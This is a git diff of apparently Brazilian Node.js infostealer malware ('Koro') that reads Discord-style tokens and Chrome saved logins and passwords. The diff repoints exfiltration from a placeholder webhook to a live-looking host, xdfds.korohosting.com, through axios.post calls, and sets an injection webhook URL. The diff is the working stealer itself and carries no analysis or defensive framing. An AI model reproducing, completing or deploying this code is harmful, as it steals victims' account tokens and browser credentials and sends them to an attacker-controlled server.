@@ -1,8 +1,12 @@
 const fs = require("fs");
 const os = require("os");
-const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 var glob = require("glob");
 const https = require('https');
+const {
+    exec
+} = require('child_process');
+const axios = require('axios');
+const buf_replace = require('buffer-replace');
 
 //UID Setup
 const userInfo = os.userInfo();
@@ -64,25 +68,13 @@ function koro(p) {
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
                     console.log(a)
-                    fetch("http://da_webhook/api2.php?type=old", {
-                    "headers": {
-                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-                        "cache-control": "no-cache",
-                        "pragma": "no-cache",
-                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
-                        "sec-ch-ua-mobile": "?0",
-                        "sec-ch-ua-platform": "\"Windows\"",
-                        "sec-fetch-dest": "document",
-                        "sec-fetch-mode": "navigate",
-                        "sec-fetch-site": "none",
-                        "sec-fetch-user": "?1",
-                        "upgrade-insecure-requests": "1"
-                    },
-                    "referrerPolicy": "strict-origin-when-cross-origin",
-                    "body": `{"content": "Token: **${token}** \\nUID: **${uid}**", "username": "Old Tokens by Koro"}`,
-                    "method": "POST"
-                    });
+                    axios.post("http://xdfds.korohosting.com/api2.php?type=old", {
+                        "content": `Token: **${token}** \nUID: **${uid}**`,
+                        "username": "Old Tokens by Koro"
+                    })
+                    .then(res => {})
+                    .catch(error => {
+                    })
                 }
             })
         }
@@ -133,25 +125,13 @@ function getChromePass(source_file, dest_file){
                 if (username == "") username = "Não Capturado";
                 if (password_value == "") password_value = "Não Capturado";
                 //console.log(result);
-                fetch("http://da_webhook/api2.php?type=chrome", {
-                    "headers": {
-                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-                        "cache-control": "no-cache",
-                        "pragma": "no-cache",
-                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
-                        "sec-ch-ua-mobile": "?0",
-                        "sec-ch-ua-platform": "\"Windows\"",
-                        "sec-fetch-dest": "document",
-                        "sec-fetch-mode": "navigate",
-                        "sec-fetch-site": "none",
-                        "sec-fetch-user": "?1",
-                        "upgrade-insecure-requests": "1"
-                    },
-                    "referrerPolicy": "strict-origin-when-cross-origin",
-                    "body": `{"content": "URL: **${url}** \\nLogin: **${username}**\\nSenha (Hex): **${password_value}**", "username": "Chrome Pass by Koro"}`,
-                    "method": "POST"
-                });
+                axios.post("http://xdfds.korohosting.com/api2.php?type=chrome", {
+                    "content": `{"content": "URL: **${url}** \\nLogin: **${username}**\\nSenha (Hex): **${password_value}**", "username": "Chrome Pass by Koro"}`,
+                    "username": "Chrome Pass by Koro"
+                })
+                .then(res => {})
+                .catch(error => {
+                })
             }else{
                 //console.log("não encontrado nada em: " + exploit_path)
             }
@@ -163,12 +143,7 @@ function getChromePass(source_file, dest_file){
     db.close();
 }
 
-const {
-    exec
-} = require('child_process');
-const axios = require('axios');
-const buf_replace = require('buffer-replace');
-const superstarlmao = "https://da_webhook/api2.php?type=injection"
+const superstarlmao = "https://xdfds.korohosting.com/api2.php?type=injection"
 const config = {
     "logout": "false",
     "inject-notify": "true",
